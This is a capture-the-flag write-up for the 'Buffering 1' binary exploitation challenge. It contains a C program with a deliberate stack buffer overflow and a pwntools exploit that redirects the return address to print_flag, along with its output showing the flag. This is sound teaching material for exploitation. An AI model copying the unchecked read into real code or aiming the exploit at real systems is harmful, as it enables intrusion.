# Buffering 1
Category: Binary Exploitation, 100 points

## Description

> The flag distributing service was updated, but now it seems to be buffering foreverrrrr

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include "flag.h"

int get_credentials();
int authenticate_with_server(int *authenticated);
void print_flag();

extern char flag[100];
char spinning_icon[4] = {'/', '-', '\\', '|'};

#define USERNAME_LENGTH 32
#define PASSWORD_LENGTH 64


int main() {
    int authenticated = 0;
    long int i = 0;

    printf("Hello and thank you for using Flag Distibuter v2.0 🚩🚩🚩\n");
	get_credentials();
    
    printf("Autenticating  ");
    while (!authenticate_with_server(&authenticated)){
        printf("\b%c", spinning_icon[(i++) % 4]);
        fflush(stdout);
        sleep(0.91);
    }

    if(authenticated)
        print_flag();
	
    return 0;
}

int get_credentials() {
	char username[USERNAME_LENGTH] = {0};
    char password[PASSWORD_LENGTH] = {0};

    printf("To receive the flag, please enter your username and password\n");
    printf("Username: ");
    fflush(stdout);
	read(STDIN_FILENO, username, PASSWORD_LENGTH);
    printf("Password: ");
    fflush(stdout);
    read(STDIN_FILENO, password, PASSWORD_LENGTH);
}

void print_flag() {
	printf("Thank you for waiting, here's the flag: %s\n", flag);
    fflush(stdout);
    exit(0);
 }

int authenticate_with_server(int *authenticated) {
    /*TODO: add authentication with server*/
    return 0;
}
```

## Solution

This is the follow-up for [Flag Server](Flag_Server.md). Let's check the diff:

```console
┌──(user@kali)-[/media/sf_CTFs/ducky_debug_duck/Buffering_1]
└─$ diff -y ../Flag_Server/flag_server.c buffering_1.c
#include <stdio.h>                                              #include <stdio.h>
#include <unistd.h>                                             #include <unistd.h>
                                                              > #include <stdlib.h>
#include "flag.h"                                               #include "flag.h"

int get_credentials();                                          int get_credentials();
int authenticate_with_server(int *authenticated);               int authenticate_with_server(int *authenticated);
void print_flag();                                              void print_flag();

extern char flag[100];                                          extern char flag[100];
                                                              > char spinning_icon[4] = {'/', '-', '\\', '|'};

#define USERNAME_LENGTH 32                                      #define USERNAME_LENGTH 32
#define PASSWORD_LENGTH 64                                      #define PASSWORD_LENGTH 64


int main() {                                                    int main() {
    int authenticated = 0;                                          int authenticated = 0;
    char username[USERNAME_LENGTH] = {0};                     |     long int i = 0;
    char password[PASSWORD_LENGTH] = {0};                     |
                                                              >     printf("Hello and thank you for using Flag Distibuter v2.
                                                              >         get_credentials();
                                                              >
                                                              >     printf("Autenticating  ");
                                                              >     while (!authenticate_with_server(&authenticated)){
                                                              >         printf("\b%c", spinning_icon[(i++) % 4]);
                                                              >         fflush(stdout);
                                                              >         sleep(0.91);
                                                              >     }
                                                              >
                                                              >     if(authenticated)
                                                              >         print_flag();
                                                              >
                                                              >     return 0;
                                                              > }

    printf("Hello and thank you for using Flag Distibuter v1. | int get_credentials() {
                                                              >         char username[USERNAME_LENGTH] = {0};
                                                              >     char password[PASSWORD_LENGTH] = {0};

    printf("To receive the flag, please enter your username a       printf("To receive the flag, please enter your username a
    printf("Username: ");                                           printf("Username: ");
    fflush(stdout);                                                 fflush(stdout);
        read(STDIN_FILENO, username, PASSWORD_LENGTH);                  read(STDIN_FILENO, username, PASSWORD_LENGTH);
    printf("Password: ");                                           printf("Password: ");
    fflush(stdout);                                                 fflush(stdout);
    read(STDIN_FILENO, password, PASSWORD_LENGTH);                  read(STDIN_FILENO, password, PASSWORD_LENGTH);
    printf("Autenticating...\n");                             <
                                                              <
    authenticate_with_server(&authenticated);                 <
                                                              <
    if(authenticated)                                         <
        print_flag();                                         <
    else                                                      <
        printf("Could not authenticate using these username a <
                                                              <
    return 0;                                                 <
}                                                               }

                                                              <
void print_flag() {                                             void print_flag() {
        printf("Authenticated, here's the flag: %s\n", flag); |         printf("Thank you for waiting, here's the flag: %s\n"
}                                                             |     fflush(stdout);
                                                              >     exit(0);
                                                              >  }

int authenticate_with_server(int *authenticated) {              int authenticate_with_server(int *authenticated) {
    /*TODO: add authentication with server*/                        /*TODO: add authentication with server*/
    sleep(1);                                                 <
    return 0;                                                       return 0;
}                                                               }
```

The buffer overflow has moved to `get_credentials` and it's impossible to authenticate since `authenticate_with_server` is now being called in a loop while not being actually implemented.

From the binary perspective, limitations are a bit more relaxed compared to the previous challenge:

```console
┌──(user@kali)-[/media/sf_CTFs/ducky_debug_duck/Buffering_1]
└─$ checksec --file ./buffering
[*] '/media/sf_CTFs/ducky_debug_duck/Buffering_1/buffering'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So, the plan is to overflow `get_credentials` and call `print_flag`:

```python
# First, create a pwntools template by calling:
#  $ pwn template --host ctf.cs.technion.ac.il --port 4053 ./buffering
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


import os

def send_payload(p, payload):
    p.recvuntil(b"Username: ")
    p.send(payload)
    p.recvuntil(b"Password: ")
    p.sendline(b"dummy")

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(90, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset

overflow_offset = get_overflow_offset()

payload = fit({overflow_offset: exe.symbols["print_flag"]})
io = start()
send_payload(io, payload)
print(io.recvall())
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/ducky_debug_duck/Buffering_1]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/ducky_debug_duck/Buffering_1/buffering'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/media/sf_CTFs/ducky_debug_duck/Buffering_1/buffering': pid 3605
[*] Process '/media/sf_CTFs/ducky_debug_duck/Buffering_1/buffering' stopped with exit code -11 (SIGSEGV) (pid 3605)
[+] Parsing corefile...: Done                                                                                                                                                                                    [*] '/media/sf_CTFs/ducky_debug_duck/Buffering_1/core.3605'
    Arch:      amd64-64-little
    RIP:       0x401380
    RSP:       0x7ffe3bb24788
    Exe:       '/media/sf_CTFs/ducky_debug_duck/Buffering_1/buffering' (0x400000)
    Fault:     0x6161616161616166
[*] Overflow offset: 40
[+] Opening connection to ctf.cs.technion.ac.il on port 4053: Done
[+] Receiving all data: Done (61B)
[*] Closed connection to ctf.cs.technion.ac.il port 4053
b"Thank you for waiting, here's the flag: flag{pl3a5e_wa1t...}\n"
```